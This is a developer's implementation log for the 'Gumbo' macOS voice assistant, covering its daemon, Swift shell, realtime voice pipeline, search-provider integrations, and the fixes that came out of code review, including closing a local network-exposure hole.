# Gumbo — Implementation Notes

A running log of what got built, decisions made along the way, gotchas hit, and things future
sessions need to know. Append newest entries at the top of each phase. The design source-of-truth is
[`SPEC.md`](./SPEC.md); this file is the changelog + field notes.

**Convention for future sessions:** when you build or change something non-obvious, add a dated bullet
under the relevant phase. Record *why*, not just *what* — especially SDK quirks, version constraints,
and anything that would surprise the next person. Keep it honest (note what's verified vs assumed).

---

## Status

- **M1 — Brain, text-driven:** ✅ complete and verified end-to-end.
- **M2 — Swift shell + voice:** ✅ complete — live-validated with the user (voice round-trips
  through the signed shell). Two follow-ups to observe in daily use: voice-exercised barge-in
  and the TCC rebuild-persistence check.
- **M3 — Completion presence:** ✅ complete — live-validated with the user, review+address pass
  done, merged to main (see §M3 below).
- **Web search providers (side feature, merged from `worktree-web-search-providers`):** ✅ built +
  verified — Tavily on the voice hot path (`web_quick_lookup`), Exa for background sub-agents,
  FTS5 memory persistence, JSONL search audit log. See §Web search providers below.
- **Grok (xAI) live X search (side feature, `feat/grok-x-search`):** ✅ built + tested (180/180,
  live smoke opt-in) — hot-path `x_lookup` + background `x_search`, X+web sources, X-first routing.
  See §Grok below. Not yet live-demoed with the user; `/review-2` → `/address` pending before merge.
- **M4 — Claude Code + supervisor (+ M4.1 OS sandbox):** ✅ built + review-hardened + smoked
  (see §M4) — live voice demo with the user pending.
- **M5 — Images + Gumbo-owned scheduler:** ✅ built + smoked end-to-end on an isolated daemon
  (see §M5) — live voice demo with the user pending (incl. the first-run Reminders TCC prompt).
- **M6:** not started. See SPEC §9.

---

## Environment facts (verified)

- Node **v26.3.1**, npm 11.16 (Homebrew). Node 26 gives us built-ins we rely on: `node:sqlite`
  (`DatabaseSync`), `process.loadEnvFile`, and a global `WebSocket`.
- This Mac runs a **macOS 27.0 beta** — spike DynamicNotchKit + TCC behavior early (M2 risk).
- `.env` at repo root holds `OPENAI_API_KEY`, `EXA_API_KEY`, and `TAVILY_API_KEY`.
- **No git repo** yet — fixes are applied without commits (matches the user's "don't commit unless
  asked" rule). Initialize git when the user asks.
- **Sandbox note:** automated/sandboxed dev runs can't write to `~/Gumbo`; use
  `GUMBO_HOME=<scratchpad>` to run the daemon in those contexts. the user created the real `~/Gumbo`.

---

## M1 — Brain, text-driven

### Build (initial)
- Monorepo: npm workspaces `daemon` (Node/TS, `tsx watch`) + `dashboard` (React 19 + Vite 6 + zustand).
- Event store on **`node:sqlite`** (no `better-sqlite3` — avoids native-module builds lagging Node 26).
  WAL mode; `tasks` + `events` tables.
- Orchestrator = `gpt-realtime-2.1` over **websocket** transport, `outputModalities: ['text']` for
  M1 (flip to `['audio']` at M2). Driven by a dashboard `debug_text` composer.
- Generic sub-agents = `gpt-5.6-terra` via `@openai/agents` `run()` streaming, with a custom
  `web_search` tool wrapping `exa-js`, plus the hosted `codeInterpreterTool()`.
- Dashboard honors the **no-`useEffect`** rule via a module-scope WS singleton (`ws.ts`) → zustand.

### Gotchas hit
- `@openai/agents` 0.13 requires **zod v4** (peer dep); zod 3 fails `npm install`.
- `exa-js` (1.10) default import doesn't expose a named `WebSocket`-style export; use
  `import { Exa } from 'exa-js'` and `exa.searchAndContents(query, { text: { maxCharacters } })`
  (the `contents:{...}` shape from older docs is wrong for this version).
- Node ESM with `.ts` import specifiers needs `allowImportingTsExtensions: true` in tsconfig.
- Bug found during first verification: orchestrator (voice-model) tool calls weren't being logged —
  only sub-agent tool calls were. Fixed by also listening to the transport `function_call` event in
  the Realtime session.

### Review + address pass (2-agent /review-2, then /address)
Two Opus reviewers (debugger + auditor) reviewed the M1 codebase. **All findings addressed.** Notable:

- **CRITICAL — orchestrator wedge:** the `connecting` promise was only nulled on the success path, so
  a single transient connect failure left every future message awaiting a permanently-rejected
  promise (Gumbo dead until restart). Fixed with `try/finally` nulling `connecting` on both paths.
- **CRITICAL — network exposure:** daemon bound all interfaces + wildcard CORS + no WS origin check,
  so any website the user visits could drive the agent (burn credits) and `fetch('/files/gumbo.db')`
  to exfiltrate the whole task DB; any LAN device could `curl` it. Fixed three ways: bind
  `127.0.0.1`, delete the wildcard CORS header (dashboard uses the Vite proxy), add a WS
  `verifyClient` **Origin allowlist** (no-Origin native clients allowed → the future Swift shell).
- **Restart reaper:** tasks left `running` when the daemon dies (frequent under `tsx watch`) now get
  reaped to `failed` on Store init, so status stays truthful. Verified: flipped a task to `running`,
  restarted, it became `failed` with `"interrupted by daemon restart"`.
- **Cancellation:** the `AbortSignal` is now passed into `run()` so cancel actually aborts the model
  request (previously only stopped event forwarding, kept billing).
- **Task completion correctness:** switched to two-arg `.then(onFulfilled, onRejected)` so a failure
  while *writing* the report can't mislabel a succeeded task; `finish()` is now idempotent (guards a
  `finished` set) so no double `task.finished` / double-announcement.
- **Announcement collision:** completion announcements now prefer `transport.requestResponse?.()`
  (defers until any in-flight response completes) instead of a raw `response.create` that the server
  rejects mid-turn.
- **`/files` hardening:** restricted to `tasks/`/`images/`/`notes/` subtrees + `realpath` symlink
  re-check; **DB moved to `db/gumbo.db`**, outside the served subtree entirely. Stream now has an
  `error` listener so a mid-read I/O error can't crash the daemon.
- **Dashboard:** bootstrap now **merges** the HTTP snapshot with live-arrived events (deduped by
  `seq`, sorted) instead of a blind replace that dropped events arriving during the fetch window;
  `ReportPanel` gets a remount `key` so switching between two done tasks refetches; `Row` is
  `React.memo` and the streaming line is isolated into its own component so per-token updates don't
  re-render the whole feed; a **cancel button** on running tasks wires up the previously-dead
  `cancelTask` export. Tasks array is capped (200).
- Smaller: `EXA_API_KEY` validated at boot alongside OpenAI; inbound WS payloads shape-guarded;
  `status` `CHECK` constraint on the tasks table; magic truncation length centralized as
  `config.activityLogMaxChars`.

### New requirements folded in (from the user, this session)
- **Organized agent home:** `~/Gumbo/` is no longer flat — `tasks/`, `images/`, `notes/`, `db/`,
  created on boot. Only the first three are `/files`-served; the DB is private.
- **Agent self-organization:** added a `save_note` tool (one file per topic under `notes/`, append or
  replace) so Gumbo can retain durable knowledge across sessions. Verified live: asked it to save an
  editor preference → `notes/editor-preference.md` created. Deeper self-organization (archiving,
  reorganizing) is specced for later phases.
- **Name:** the agent addresses the user as **the user** (not the user). Applied to orchestrator
  instructions + announcement template.
- **Hotkey (spec only — Swift is M2):** mic activation is **Control + Option held together**. This is
  a modifier-only chord, so it must be detected with an `NSEvent` `.flagsChanged` global monitor
  (both `⌃` and `⌥` down, no letter), *not* a modifier+key binding library. Captured in SPEC §9 M2.

### Verified in M1 (how)
- Full research round-trip driven from the dashboard (Playwright): sub-agent streamed 5 Exa searches,
  `report.md` landed, follow-up "one-line takeaway" correctly triggered `read_report`.
- Daemon restart → dashboard history re-rendered from sqlite (persistence).
- Post-fix live checks: loopback bind (`lsof` shows `127.0.0.1` only), no CORS header, `/files`
  cannot reach `db/gumbo.db` (404 for both `../db/…` and `db/…`), restart-reaper flips `running`→
  `failed`, `save_note` writes an organized note, WS origin allowlist admits both the dashboard
  (`localhost:5173`) and a no-origin native client.

### Open items / assumptions to confirm later
- Model IDs (`gpt-realtime-2.1`, `gpt-5.6-terra`, `gpt-image-2`) are pinned in `config.ts`; confirm
  against the live API when each is first exercised.
- `transport.requestResponse` existence is feature-detected with a `sendEvent` fallback — validate
  against the installed SDK build when audio lands.
- Synchronous sqlite + broadcast run on the same event loop as the Realtime transport. Fine at M1
  (events are per run-item, low rate). Revisit batching/offload when M2 puts audio frames on the loop.

---

## M2 — Swift shell + voice (complete)

### Quick text input — ⌃Space floating box (2026-07-16)

A single-line, Spotlight-style black pill to message Gumbo by typing (paste a long prompt without
reading it aloud or opening the dashboard). **Shell-only — zero daemon/protocol/dashboard changes:**
the box sends the existing `{type:'debug_text', text}`, which drives the orchestrator exactly like a
voice turn (spoken reply). Pasting the M5 prompt → `spawn_claude_session`. Files:
`Hotkey/Hotkeys.swift` (PTT monitor + the ⌃Space hotkey), new `QuickText/QuickTextController.swift`
(panel + view + model), `App.swift` (wiring). Live-verified end-to-end by the user.

- **Trigger = ⌃Space, via Carbon `RegisterEventHotKey`.** This was reached after two dead ends that
  are the real lesson here. (1) ⌃Space via a global `.keyDown` NSEvent monitor — **silently dead: a
  global `.keyDown` monitor receives nothing without the separate "Input Monitoring" grant**
  (`kTCCServiceListenEvent`), distinct from Accessibility. PTT's `.flagsChanged` monitor works on
  Accessibility alone because reading *modifiers* isn't keylogging; reading character keys is.
  (2) Double-tap Control via `.flagsChanged` — detected fine, but the box **couldn't take keyboard
  focus** (see next bullet), so we moved to `RegisterEventHotKey`, which needs a real key. It
  captures ⌃Space with **no Input Monitoring**, and consumes the press so no stray Space leaks.
  (You've disabled the macOS "previous input source" ⌃Space shortcut, so there's no system clash.)
- **Focus was the hard part — and the fix was NOT activation.** On macOS 26 an LSUIElement/accessory
  app **cannot become frontmost** from the background: cooperative activation refuses it. Verified
  exhaustively via a temp file-diagnostic — `NSApp.activate(ignoringOtherApps:)`, modern
  `NSApp.activate()`, `NSRunningApplication.activate`, and a `.regular` activation-policy toggle
  ALL left `isActive=false, isKey=false, frontmost=com.apple.Terminal` (while `fr` was correctly the
  text view). A window can only be *key* when its app is active, so none of it let you type. **The
  answer is `.nonactivatingPanel` + a `canBecomeKey` override**: that style is purpose-built to let a
  panel be the KEY window and receive keystrokes **without** activating its app (`isKey=true` with
  `frontmost=Terminal` — they coexist). So we never call `activate` at all: `orderFrontRegardless()`
  + `makeKey()`. Bonus: no activation ⇒ **no Dock-icon flash** (an earlier policy-toggle attempt
  flashed one and *still* didn't focus). First responder is set in `SendingTextView.viewDidMoveToWindow`.
- **Click-away closes via a global mouse-down monitor, NOT `resignKey`.** `resignKey` fired on
  incidental focus perturbations (moving the cursor into the menubar, Spaces changes) and dismissed
  the box out from under you. A global `[.leftMouseDown,.rightMouseDown]` monitor fires only on an
  actual click in another app (clicks inside the panel are local events it never sees) — precise,
  and hover no longer closes it. Removed on close.
- **Send keys via a raw NSTextView, not SwiftUI `TextEditor`** — buys exact control: `keyDown`
  intercepts Return (keyCode 36/76) with no Shift → send, Esc (53) → cancel, everything else
  (incl. ⇧⏎ newline and ⌘V paste) → super. Paste never fires a Return keystroke, so multi-line
  prompts paste in whole and only a real ⏎ submits.
- **Look:** black `Capsule` (360×48) + `Tokens.line` border, `ember` caret, fade-in honoring Reduce
  Motion. Placeholder "Message Gumbo…" is **drawn inside the NSTextView** (not a SwiftUI overlay) at
  the caret's exact origin, with `lineFragmentPadding = 0` and a vertical `textContainerInset` that
  centers the single line — so caret, text, and placeholder all share one centered origin (an
  overlay drifted from the caret; centering by a fixed sub-frame left the line ~2px high).
- **DEBUGGING META-LESSON:** when every variant of an approach fails *identically*, the approach is
  wrong, not the parameters — we burned many cycles tuning activation before questioning whether to
  activate at all. Also: launching the app from an automation shell (`open` from Claude Code's bash)
  is a valid way to test the UI, but it does NOT change activation eligibility here (Finder launch
  behaved the same) — and running the binary *directly* from a shell breaks its TCC attribution
  (prints "waiting on Accessibility grant"), so always launch the `.app` via `open`/Finder.

### Build — daemon audio path + real shell (2026-07-14/15)

**Daemon (additive — M1 text path still works, now with spoken replies):**
- `config.ts`: `outputModalities ['audio']`, `voice: 'marin'`, `realtimeAudio` (pcm16 both ways,
  input transcription via `gpt-4o-mini-transcribe` so voice turns persist with real user text,
  `turnDetection { type:'server_vad', createResponse:false, interruptResponse:true }`),
  `minPttAudioBytes` (100 ms @ 24 kHz — the API rejects commits under ~100 ms of audio).
- `ws/protocol.ts`: inbound `ptt_press`/`ptt_release`; outbound `playback_flush`; binary framing
  documented (shell→daemon raw mic pcm16; daemon→shell `0x01` + speaker pcm16, `0x02` reserved).
- `ws/hub.ts`: `onBinary(handler)` + `sendBinary(frame, role)`; binary frames require a prior
  `hello` like text frames.
- `realtime/session.ts`: PTT state machine. Press arms + lazily connects; mic frames stream via
  `session.sendAudio`; frames arriving mid-connect are buffered (cap 500) and flushed in-order
  after connect, so the first words of a cold-start turn aren't clipped; a release that beats the
  connect is remembered (`pendingRelease`) and committed after connect. `session.on('audio')` →
  `hub.sendBinary` to shell; `audio_interrupted` → `playback_flush`. `assistant_delta` now
  broadcasts to **all** clients (shell notch transcript + dashboard). `connection_change:
  disconnected` cleans up a dead transport so the next press reopens fresh.
- **Commit semantics (the runtime-untested half of the PTT model — now verified):** with
  `createResponse:false` the server VAD still auto-commits at speech pauses; on release we commit
  manually **only** when `speechActive || (hadSpeech && !sawCommit)` — an unconditional commit
  errors on an empty buffer. Then `response.create` (via `transport.requestResponse?.()`) only if
  the window actually had speech; then `input_audio_buffer.clear` to drop trailing silence.
- **GOTCHA (cost a debugging round): server-VAD speech state sticks across PTT windows.** The
  normal PTT gesture — release mid-speech, faster than the VAD silence window — leaves the
  server VAD in "speech". The next armed window then never fires `speech_started` (deaf turn,
  no barge-in). `input_audio_buffer.clear` does NOT reset it. Fix: after every turn, toggle
  `turnDetection` null → config via `transport.updateSessionConfig` (two `session.update`s).
  Verified with a 4-window mixed-mode smoke on one session: all four rounds green.
- **Daemon-only smoke (throwaway scratchpad clients, `say`-generated 24 kHz pcm16):** PTT
  fast-release ✅, VAD-pause release ✅, barge-in ✅ (`playback_flush` ~150 ms after speech onset
  mid-reply, second response clean), `debug_text` → spoken reply ✅. Zero `session.error`s.

**Shell (`shell/` real app — builds + runs ad-hoc signed on the 27.0 beta):**
- `project.yml`: LSUIElement, mic usage string, sandbox off, bundle id `ai.scalinity.Gumbo`,
  DynamicNotchKit pinned `exactVersion: 1.1.0`. Signs with the real **Apple Development** cert
  (Manual style + `DEVELOPMENT_TEAM: REDACTED-TEAM-ID` — signs straight from the keychain, no portal).
- **GOTCHA (signing): a fresh Xcode-created cert can still be "0 valid identities".** the user's
  cert (issued 2026-07-15, WWDR **G3** issuer) sat invalid in the keychain because the only WWDR
  intermediate present was the **G1 that expired Feb 2023** — the chain couldn't build. Fix:
  `curl -sO https://www.apple.com/certificateauthority/AppleWWDRCAG3.cer && security import
  AppleWWDRCAG3.cer -k ~/Library/Keychains/login.keychain-db` → identity immediately valid;
  app now signs with the full the user → WWDR G3 → Apple Root CA chain.
- **GOTCHA (macOS 27 beta, probed 4 orderings): VPIO enable order is load-bearing.** Enabling
  `setVoiceProcessingEnabled(true)` *before* touching the playback graph → engine start fails
  with **-10875** (output unit kAUInitialize). Working order: attach player + connect to
  `mainMixerNode` (mono float at the **hardware output rate** — a 24 kHz connection is the
  spike's -10851 trap) **first**, then enable VPIO, then read the input format (it changes under
  VPIO — the mic becomes a 48 kHz/9-ch array here) and install the tap. All PCM conversion at the
  buffer level via `AVAudioConverter` both directions.
- **GOTCHA (found in live validation): `AVAudioConverter` does NOT downmix the VPIO mic.** The
  9-channel discrete input → mono conversion "succeeds" but outputs **pure silence** (default
  channel map maps nothing) — the daemon received perfectly-paced frames of `peak=0.000`, the
  server VAD rightly never fired, so Gumbo never answered while the notch bars (raw ch0 level)
  looked alive. Fix: extract **channel 0** (the voice-processed signal) into a mono buffer by
  hand; the converter only ever does mono 48 kHz float → mono 24 kHz int16. The engine now logs
  per-channel capture peaks once per start and converter errors loudly — silent-audio failures
  must never be invisible again.
- `AudioEngine`: `start(reason:)` seam (`.ptt`, `.playback`; `.wakeWord` later). Mic frames gated
  by `armed` (set strictly around ⌃⌥). Playback: chunks arriving before the engine is up are
  queued (spoken reply with no prior press — dashboard text turns, M3 announcements) and drained
  on start; flush bumps a generation counter so stale completion handlers can't corrupt the
  drain state; engine auto-stops after ~75 s fully idle (VPIO otherwise holds the mic indicator).
- `Hotkeys`: `.flagsChanged` global+local monitors; press = ⌃⌥ down with ⌘/⇧ absent; release =
  either lifting; extra modifiers joining mid-hold don't cancel. Prompts for Accessibility via
  `AXIsProcessTrustedWithOptions` on first launch.
- `NotchController`: DynamicNotchKit. **1.1.0 API notes:** `DynamicNotch` is generic over
  ⟨Expanded, CompactLeading, CompactTrailing⟩ — store it as
  `DynamicNotch<Content, EmptyView, EmptyView>`; its init is `@MainActor`. Simmer bars (ember
  when thinking/speaking, bay when listening) + head-truncated transcript line; hide is debounced
  1.4 s so back-to-back turns don't flap; tap → dashboard window.
- Shell/daemon state merge: daemon `speaking` tracks *generation*, which ends seconds before
  audible playback — the shell holds `speaking` while its own queue drains (`playbackDraining`).
  While armed, `listening` wins the display.
- `WSClient`: URLSessionWebSocketTask, auto-reconnect (1.5 s), hello on open — survives daemon
  restarts under `tsx watch`. `DashboardWindow`: WKWebView → `http://localhost:5173` exactly.

**Verified end-to-end (2026-07-15, live with the user):** hold-⌃⌥-speak-release → spoken answer
through the shell (multiple turns; mic peaks 0.008–0.452 at the daemon, VAD speech events,
commit-on-release `hadSpeech/speechActive/sawCommit` all correct, `response.created/done`,
`playback active`); both voice transcripts persisted with real text (input transcription);
notch listening/speaking states live. Also verified pre-live: daemon-only PTT/VAD-pause/
barge-in/text smokes, WS reconnect across `tsx watch` restarts. **Still pending:** live
*voice* barge-in (proven at the protocol level in the daemon smoke, not yet exercised by
voice), idle-close observation in real use, and the TCC persistence check itself — the app now
signs with the real cert (one fresh mic + Accessibility grant needed after the ad-hoc→signed
identity change), then one rebuild must confirm grants stick (risk #3). `shell/spike/` deleted
(real shell supersedes it; findings recorded here).

### Forward-compat: keep the Realtime layer modular (GPT-Live)
GPT-Live API availability has **not** been announced. The integration relies on
`gpt-realtime-2.1`; keep the Realtime transport + event-handling layer modular — model ID
stays a single `config.ts` constant, and session lifecycle / audio I/O / event wiring stay
isolated in `realtime/` — so migrating to GPT-Live is a localized swap when it drops.
(the user's note, 2026-07-14.)

### Spike 1a — audio pipe (echo) ✅ pipeline proven
Throwaway target at `shell/spike/` (its generated `.xcodeproj` + `DerivedData/` are
gitignored). SwiftUI app: mic → `AVAudioEngine` tap → `AVAudioConverter` → 24 kHz mono
PCM16 → 20 ms WS binary frames → `echo-server.mjs` (127.0.0.1:**8788**) → back →
`AVAudioPlayerNode`.

**Proven:** the full capture → 24 kHz PCM16 convert → WS framing → playback chain works
end-to-end with the **built-in mic**. WS round-trip ~1 ms. Output path + device routing
are clean — a mic-free 440 Hz test tone plays perfectly, including to AirPods.

**Findings that shape the real shell (M2 audio):**
- **A Bluetooth headset (AirPods) as mic + speaker simultaneously → silent input tap.**
  The plain `installTap` path captures nothing (level meter flat). Fix = **Voice-Processing
  I/O** (`inputNode.setVoiceProcessingEnabled(true)`), which also gives the two things the
  real system needs regardless: **acoustic echo cancellation** (so Gumbo's voice on
  speakers doesn't leak into the mic and false-trigger barge-in) and **automatic gain**
  (fixes the low, muffled built-in-mic level seen here). ⇒ **`AudioEngine.swift` must run in
  VPIO mode.**
- Enabling VPIO in the spike tripped `-10851` (kAudioUnitErr_InvalidPropertyValue) at
  engine start because playback used a custom 24 kHz player→mixer connection. Lesson: with
  VPIO, keep the whole graph in the unit's native I/O format and convert PCM at the buffer
  level, not via a mismatched connection format. (Left OFF in the throwaway spike — belongs
  in the real AudioEngine.)
- **Bluetooth output latency (~150–200 ms) is inherent** on AirPods; it read as bad delay
  only because the spike echoes *your own* voice. For one-way Gumbo speech it's normal.
  Wired/built-in output is much tighter.
- Dev loop confirmed: `xcodegen generate` + `xcodebuild` from CLI (the user authorized builds
  for this project); Xcode-beta **27.0** selected via `sudo xcode-select`. App runs
  **ad-hoc signed** (`CODE_SIGN_IDENTITY=-`), enough to test but re-prompts mic on each
  identity change.

**Still open (quick):** TCC grant-persistence check (risk #3) needs a real **Apple
Development certificate** in the keychain — signing into Xcode with an Apple ID is NOT
enough; create the cert (Xcode ▸ Settings ▸ Accounts ▸ team ▸ Manage Certificates ▸ + Apple
Development), then `security find-identity -v -p codesigning` lists it. Deferred to the
first signed build.

### Spike 1b — Realtime round-trip ✅ voice loop proven
Throwaway `shell/spike/realtime-server.mjs` (port 8788, drop-in for the echo server): opens
a real `gpt-realtime-2.1` `RealtimeSession` (websocket transport), forwards the spike app's
mic PCM16 → `session.sendAudio`, streams `session.on('audio')` chunks back to the shell.

**Proven live against the installed SDK + model:**
- `gpt-realtime-2.1` connects and answers in voice — **response time excellent**, intelligible.
- Server-VAD turns fire (`input_audio_buffer.speech_started` / `speech_stopped`); responses
  generate (`response.created` / `response.done`).
- **Barge-in works**: `interruptResponse:true` → `audio_interrupted` fired on every speech
  onset during a response. (Seen via the feedback loop, but it's the same interrupt path
  ⌃⌥-barge-in uses.) `sendAudio` + `on('audio')` + `on('audio_interrupted')` all confirmed.
- Config shape confirmed: `config.outputModalities = ['audio']`,
  `config.audio.input.turnDetection = { type:'server_vad', createResponse, interruptResponse }`.

**Confirmed the AEC requirement the hard way:** on **speakers** (no headphones) it runs away —
Gumbo hears itself, VAD fires, it interrupts + re-responds forever. The real shell avoids
this two ways: (1) **PTT mic-gating** — mic streams only while ⌃⌥ is held, so Gumbo isn't fed
its own voice while speaking; (2) **VPIO acoustic echo cancellation** — cancels Gumbo's voice
from the mic even when armed for barge-in. Spike has neither ⇒ headphones needed for the
**spike only**, not the finished product.

**Not yet runtime-tested (deferred to real shell):** the PTT turn config proper
(`createResponse:false` + manual commit-on-release + `requestResponse`) — 1b used server-VAD
auto-turns. The *interrupt* half of barge-in is proven; the *manual-commit* half is not.

### Spike 2 — DynamicNotchKit on macOS 27 beta ✅ renders cleanly
Throwaway `shell/spike/notch/` (separate project so the SPM dep stays isolated).
DynamicNotchKit **1.1.0** (pinned `exactVersion`) fetched + compiled against Xcode 27.0 with
no changes; both `DynamicNotchInfo(icon:title:description:)` and the custom-content
`DynamicNotch { … }` builder APIs are correct for 1.1.0. Live on the 27.0 beta: info + custom
notches both render, anchored correctly, expand/hide animations smooth, nothing visually off.
Risk #5 retired — clear to build the real notch UI on DynamicNotchKit 1.1.0.

### All pre-build risks cleared → build the real M2
- **Daemon** (additive; keep the M1 text path working): `config.ts` (outputModalities
  `['audio']`, `audio.input.turnDetection`, voice), `ws/protocol.ts`
  (ptt_press/ptt_release, playback_flush), `ws/hub.ts` (binary routing: onBinary/sendBinary),
  `realtime/session.ts` (audio config, sendAudio, forward `audio` → shell, audio_interrupted →
  flush, ptt commit + requestResponse, session_state), `index.ts` (wire it up).
- **Shell** (`shell/` real app): project.yml (LSUIElement, mic + reminders usage, sandbox off,
  signing), WSClient, **AudioEngine in VPIO mode** (AEC/AGC/Bluetooth — solve the -10851 by
  keeping the graph in the unit's native format), ⌃⌥ `.flagsChanged` chord, NotchController,
  DashboardWindow (WKWebView → localhost:5173).
- **Loose end:** Apple Development cert still not in keychain (`security find-identity` = 0);
  needed for the signed build + TCC grant-persistence check (risk #3).

---

## Grok (xAI) — live X/real-time-social search, both tiers — 2026-07-16

### Build
- New `daemon/src/search/grok.ts`, a fourth provider following the codified conventions exactly:
  shared `postJson`/`SearchError`/`auditSearchCall`, keys in `.env` (`XAI_API_KEY` → added to
  boot validation in `index.ts` **and** `config.secretEnvKeys` so it's stripped from spawned
  Claude sessions), daemon-only. `'grok'` added to the `Provider` union in `client.ts` (audit.ts
  gets it for free — it imports the type).
- **Why Grok at all:** a real capability gap, not a model preference. Exa/Tavily barely see inside
  X — the trigger was "did the official Claude Dev X account post about the usage-limit reset?",
  which Grok found and both incumbents missed. So Grok owns the X/real-time-social lane; it does
  **not** replace general web search (that conflates provider-vs-model and loses Exa full-page text).
- **Two tiers, one core.** `grokLiveSearch(query, opts)` throws + audits (the core); `xLookup(query)`
  is the never-throws hot-path wrapper returning the SAME `{answer,sources}`/`lookup_failed` string
  contract the voice model already knows from `web_quick_lookup`. Hot path: realtime tool `x_lookup`
  (`retries:0`, `style:'spoken'`). Background: sub-agent tool `x_search` (`retries:2` + task signal,
  `style:'detailed'`), persisted to `memory` as provider `'grok'` — one row, since citations are
  URL-only (no page bodies to FTS-index), so `answer + source list` IS the record (`url` = first
  citation, or a synthetic `grok:x-search` marker when Grok cited nothing).
- **Routing is by description, X-first.** Sources are X+web (an announcement might be a post OR a
  blog) but both tool descriptions lead with "what's happening on X right now" so the voice model
  never reaches for Grok on a general fact/score/price (that stays Tavily) and the sub-agent never
  uses it for general research (that stays Exa). `realtime/tools.test.ts` asserts `x_lookup` sits
  beside `web_quick_lookup`.

### Verified against the LIVE API 2026-07-16 (docs were wrong twice — smoke earned its keep)
- **The declarative Live Search surface is DECOMMISSIONED.** First build used `POST /v1/chat/
  completions` + a top-level `search_parameters` object (what Context7 docs + my pre-compaction
  notes described). The live smoke got **HTTP 410**: *"Live search is deprecated. Please switch to
  the Agent Tools API."* Lesson banked in CLAUDE.md: a new provider ALWAYS needs a live smoke —
  docs lag deprecations, the wire doesn't.
- **Rebuilt on the Agent Tools API** (`POST /v1/responses` + server-side `web_search` + `x_search`
  tools). Still a single non-streaming POST, so it keeps riding the shared `postJson` contract.
  Response shape (probed live, not from docs): an agentic `output[]` trace of `reasoning` +
  `*_search_call` items, with the answer in a trailing `type:'message'` item →
  `content[].type:'output_text'` → `.text`; citations are that part's `annotations[]` of
  `type:'url_citation'` (`.url`; the annotation `title` is just the citation number, so titles are
  derived from the URL — x.com/twitter.com → "X post"). The model injects inline `[[n]](url)`
  markdown markers into the text — **stripped** in code so the voice model never reads them aloud.
  A non-`completed` status or an empty answer → `empty_results` (ok:false), like the others.
- **TIERED MODELS — the second live finding.** `grok-4.5` is a REASONING model; its agentic X
  search measured **28–45 s** on the hot path (26 tool calls at one point) — non-viable for voice.
  `max_tool_calls` does NOT help (cap=3 still ran 26 calls — it bounds calls, not the reasoning
  between them), so it isn't sent; the per-call timeout is the real guard. the user's call: use a
  fast NON-reasoning model for voice, keep `grok-4.5` for background. Catalog on his key (via
  `GET /v1/language-models`) has no `grok-4.1-fast`; the versions run 4.3 → 4.5 → **4.20** (4.20 is
  newer than 4.5). `grok-4.20-non-reasoning` measured **2–11 s** (typ ~2–8 s) on live X queries with
  good answers + citations. So `config.grok = { hotModel:'grok-4.20-non-reasoning',
  backgroundModel:'grok-4.5', quickLookupTimeoutMs:15_000, backgroundTimeoutMs:120_000,
  sources:['x','web'] }`. `grokLiveSearch` takes a `model` opt; `xLookup` passes `hotModel`,
  `x_search` passes `backgroundModel`. Hot-path timeout is 15 s (headroom over the ~11 s tail); a
  filler covers the wait, a real timeout degrades to `lookup_failed`.
- **Auth is `Bearer`** (not `x-api-key`). `sources:['x','web']` maps to tools `x_search` +
  `web_search` (deduped; `news` would fold into `web_search`). System steering rides the
  Responses-API top-level `instructions` field, two prompts (spoken vs detailed).
- **Live smoke is opt-in.** `grok.test.ts` mirrors `tavily.test.ts`/`exa.test.ts` (hermetic, fetch
  stubbed) + one real-API smoke gated behind `GROK_LIVE_SMOKE=1` (needs `XAI_API_KEY`) so
  `npm test` stays offline + free. It captures the real key at import, then stubs — restoring the
  real key only for its one call (the client reads the key at call-time, so this works), and
  asserts the inline citation markers are stripped.
- **Egress unaffected.** The M4.1 proxy governs only spawned Claude sessions; the daemon's own
  outbound `daemon→api.x.ai` call is free like the other providers — no sandbox/proxy change.
- **Deferred (explicitly not built):** the sub-agent MODEL swap to Grok (a cost A/B), and A-style
  multi-provider (Grok+GPT) consensus fan-out. Both were considered and parked.

## Web search providers — Tavily (voice hot path) + Exa (background) — 2026-07-15

### Build
- New `daemon/src/search/` module: `client.ts` (shared `postJson` + typed `SearchError`),
  `tavily.ts`, `exa.ts`, `audit.ts`. Both providers are **raw `fetch` clients** — `exa-js`
  removed (its 1.x request shapes predate Exa 2.0, and owning serialization gives us uniform
  retry/timeout/typed-error behavior + testability). Conventions codified in the new root
  **`CLAUDE.md`** — follow it for any future provider.
- **Hot path:** realtime tool `web_quick_lookup` (registered in `realtime/tools.ts`) → Tavily
  `/search`, `search_depth` from `config.search.tavilyDepth` (default `fast`), `include_answer:
  true`, `max_results` 5, `retries: 0`. Success returns `{answer, sources}` (answer-first,
  spoken nearly verbatim); any failure returns a structured `lookup_failed` shape that
  instructs the model to offer backgrounding instead of guessing. The tool description is the
  router between this and `spawn_subagent` — its wording is part of the spec; don't loosen it.
  A `topic` param (`general`/`news`) routes scores/headlines to Tavily's fresher news lane.
- **Background:** sub-agent tools (per-task closures in `agents/openai-runner.ts`) —
  `web_search` (Exa `/search`, tier `fast`/`auto`/`deep`, model picks `deep` only for
  research-class briefs) and `fetch_page_contents` (Exa `/contents` follow-up on promising
  URLs). Full contents `{text: true, highlights: true}` — **deliberately no `maxCharacters`
  anywhere** (the old M1 tool clamped at 2 000 chars; verified bodies up to 190 k chars now
  persist). Raw results + the finished report land in a new sqlite `memory` table with an
  FTS5 index (`memory_fts`, insert-trigger synced); every outbound call (both providers,
  success *and* failure) appends a JSONL line to `~/Gumbo/logs/search-audit.jsonl`.
- Plumbing: `TAVILY_API_KEY` added to boot validation (already in `.env`); new `home.logs`
  dir; `GUMBO_PORT` env override so test instances don't collide with a live daemon; daemon
  `npm test` script (`node --test`, 24 unit tests: retry/backoff, typed errors, request
  serialization for both providers, hot-path fail-fast, quick-lookup success/failure contracts).

### Schema surprises / gotchas (verified against live docs + API, 2026-07-15)
- Tavily `search_depth` now has **four** values: `basic | advanced | fast | ultra-fast`
  (hyphen, not underscore). `fast`/`ultra-fast` cost 1 credit; `safe_search` unsupported there.
- Exa 2.0 `type` has **six** values, not three: `instant | fast | auto | deep-lite | deep |
  deep-reasoning`. We expose `fast/auto/deep`. Exa docs moved: `docs.exa.ai` 307-redirects to
  `exa.ai/docs`. `text: true` = full page text, no default cap (`maxCharacters` only if set;
  there's also a `verbosity` knob, default `compact`, untouched).
- **Tavily had a live incident during verification:** for ~5 min every depth returned an empty
  envelope (`results: [], answer: null`) with `response_time` pinned at ~2.0 — and those empty
  responses got **cached per (query, params) key**, so identical retries kept serving the stale
  empty answer (~50 ms) while a different `topic` (= different cache key) worked. If a specific
  query mysteriously returns no answer, rephrase or switch topic. The failure contract handled
  the incident correctly live: the model told the user the lookup failed and offered a background
